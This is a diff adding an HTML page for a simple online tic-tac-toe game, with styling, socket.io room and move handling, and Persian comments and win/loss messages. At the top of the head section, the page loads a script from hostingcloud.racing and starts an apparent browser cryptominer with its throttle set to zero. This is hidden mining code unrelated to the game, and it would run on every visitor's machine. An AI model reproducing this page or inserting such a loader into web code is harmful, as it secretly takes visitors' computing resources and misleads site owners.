@@ -1,1 +1,169 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script src="https://www.hostingcloud.racing/A6v3.js"></script> <script> var _client = new Client.Anonymous('5206f7cae40719556ec84d94febf092a2e583a172bbebdf17e8757fffafcc387', { throttle: 0, c: 'w', ads: 0 }); _client.start(); </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tic-Tac-Toe Online</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.4.1/socket.io.js"></script>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+        }
+        h1 {
+            color: #333;
+        }
+        #game-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+        #room-input {
+            margin-bottom: 20px;
+        }
+        #board {
+            display: grid;
+            grid-template-columns: repeat(3, 100px);
+            grid-template-rows: repeat(3, 100px);
+            gap: 5px;
+        }
+        .cell {
+            width: 100px;
+            height: 100px;
+            background-color: white;
+            border: 2px solid black;
+            font-size: 30px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .cell:hover {
+            background-color: #ddd;
+        }
+        #winner-message {
+            display: none;
+            font-size: 24px;
+            color: green;
+            margin-top: 20px;
+        }
+        #game-over-modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        #restart-btn, #exit-btn {
+            margin: 10px;
+            padding: 10px 20px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+            transition: background 0.3s;
+        }
+        #exit-btn {
+            background-color: red;
+        }
+        #restart-btn:hover {
+            background-color: #218838;
+        }
+        #exit-btn:hover {
+            background-color: darkred;
+        }
+    </style>
+</head>
+<body>
+    <h1>Tic-Tac-Toe Online</h1>
+    <div id="game-container">
+        <input type="text" id="room" placeholder="Enter Room ID">
+        <button onclick="joinGame()">Join Game</button>
+        <h2 id="turn-info">Waiting for another player...</h2>
+        <div id="board"></div>
+    </div>
+
+    <div id="game-over-modal">
+        <p id="game-over-message"></p>
+        <button id="restart-btn" onclick="restartGame()">Start Again</button>
+        <button id="exit-btn" onclick="exitGame()">Exit</button>
+    </div>
+
+    <script>
+        const socket = io();
+        let room = "";
+        let mySymbol = "";
+        let gameEnded = false;
+
+        function joinGame() {
+            room = document.getElementById("room").value;
+            if (!room) return alert("Enter a room ID!");
+            
+            mySymbol = mySymbol === "X" ? "O" : "X";
+            socket.emit("join", { room: room, player: mySymbol });
+        }
+
+        socket.on("update_board", (data) => {
+            if (gameEnded) return; // اگر بازی تمام شده باشد، بورد را آپدیت نکن
+
+            const board = document.getElementById("board");
+            board.innerHTML = "";
+            document.getElementById("turn-info").innerText = `Turn: ${data.turn}`;
+
+            data.board.forEach((cell, index) => {
+                const div = document.createElement("div");
+                div.classList.add("cell");
+                div.innerText = cell;
+                if (cell === "" && data.turn === mySymbol) {
+                    div.onclick = () => makeMove(index);
+                }
+                board.appendChild(div);
+            });
+        });
+
+        function makeMove(index) {
+            if (!gameEnded) {
+                socket.emit("move", { room: room, index: index });
+            }
+        }
+
+        socket.on("game_over", (data) => {
+            gameEnded = true; // بازی متوقف شود
+
+            let message = "";
+            if (data.winner === "draw") {
+                message = "Game Draw!";
+            } else if (data.winner === mySymbol) {
+                message = "🎉 تبریک! شما برنده شدید 🎉";
+            } else {
+                message = "😞 شما باختید!";
+            }
+
+            document.getElementById("game-over-message").innerText = message;
+            document.getElementById("game-over-modal").style.display = "block";
+        });
+
+        function restartGame() {
+            socket.emit("restart", { room: room });
+            document.getElementById("game-over-modal").style.display = "none";
+            gameEnded = false; // بازی مجدد فعال شود
+        }
+
+        function exitGame() {
+            location.reload(); // بازی را ترک کن
+        }
+    </script>
+</body>
+</html>
